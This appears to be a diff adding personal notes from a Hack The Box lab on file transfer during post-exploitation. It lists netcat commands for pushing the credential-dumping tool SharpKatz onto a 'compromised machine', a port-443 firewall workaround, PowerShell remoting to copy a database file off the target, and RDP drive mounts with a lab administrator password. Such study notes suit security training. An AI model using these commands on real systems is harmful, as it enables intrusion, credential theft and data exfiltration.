@@ -1,0 +1,41 @@
+netcat on a compromised machine!
+ontarget:
+ncat -l -p 8000 --recv-only > SharpKatz.exe ((or file name))
+
+on host:
+ncat --send-only <target-ip> 8000 < SharpKatz.exe ((or file name))
+
+
+IF THERE IS A FIREWALL, TRY DIFFERENT PORT:
+on host:
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+on target:
+nc <host-ip> 443 > SharpKatz.exe
+
+
+
+POWERSHELL TCP PORT CHECK:
+on the target computer, try:
+hostname
+<hostname>
+
+then:
+Test-NetConnection -ComputerName <hostname> -Port 5985
+
+If TcpTestSucceeded: True, then create a remoting session:
+$Session = New-PSSession -ComputerName <hostname>
+
+we can copy from our localhost to the created session:
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+or copy from database to our localhost:
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+
+
+RDP:
+You can mount a linux folder using rdesktop:
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+
+or mount a linux folder using xfreerdp:
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
